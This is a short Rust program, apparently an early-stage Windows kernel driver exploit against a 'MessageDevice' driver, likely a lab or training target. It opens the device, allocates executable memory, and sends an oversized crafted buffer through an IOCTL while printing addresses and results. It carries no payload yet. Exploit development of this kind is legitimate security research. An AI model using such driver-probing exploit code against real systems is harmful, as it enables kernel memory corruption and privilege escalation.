use win_kexp::win32k::{allocate_memory, close_handle, get_device_handle, io_device_control, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use win_kexp::util::pause;
use std::iter;
use core::ffi::c_void;

fn message_manager_exploit() {
    let device_path = r"\\.\MessageDevice\0";

    println!("[+] Getting device handle {device_path}...");

    let h_device = get_device_handle(device_path);

    println!("[+] Successfully opened device handle.");

    let allocated_address = allocate_memory(0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    let allocated_address_hex = allocated_address as u64;
    println!("\t[*] Address of input: 0x{allocated_address_hex:x}");

    let mut input = Vec::new();
    input.extend(0x00800000u32.to_le_bytes());
    input.extend(0x0000000000000200u64.to_le_bytes());
    input.extend(iter::repeat(0x41u8).take(0x1000));

    let input_address = input.as_ptr() as *mut c_void;
    let input_address_hex = input_address as u64;
    println!("\t[*] Address of input: 0x{input_address_hex:x}");

    let mut output = Vec::new();
    output.extend(iter::repeat(0x42u8).take(0x4));

    let _output_address = output.as_ptr() as *mut c_void;
    let _output_address_hex = _output_address as u64;
    println!("\t[*] Address of output: 0x{_output_address_hex:x}");

 //   io_device_control(h_device, 0x222000, input_address, input.len().try_into().unwrap(), _output_address, output.len().try_into().unwrap());

 //   println!("[+] Input qword 1: 0x{:016x}", u64::from_le_bytes(input[..8].try_into().unwrap()));
 //   println!("[+] Input qword 2: 0x{:016x}", u64::from_le_bytes(input[8..16].try_into().unwrap()));
 //  println!("[+] Output qword 1: 0x{:08x}", u32::from_le_bytes(output[..4].try_into().unwrap()));

 //  pause();
    
    io_device_control(h_device, 0x222008, input_address, input.len().try_into().unwrap(), _output_address, output.len().try_into().unwrap());

    println!("[+] Input qword 1: 0x{:016x}", u64::from_le_bytes(input[..8].try_into().unwrap()));
    println!("[+] Input qword 2: 0x{:016x}", u64::from_le_bytes(input[8..16].try_into().unwrap()));
    println!("[+] Output qword 1: 0x{:08x}", u32::from_le_bytes(output[..4].try_into().unwrap()));


    close_handle(h_device);

    println!("[+] Successfully closed device handle.");
}

fn main() {
    message_manager_exploit();
}
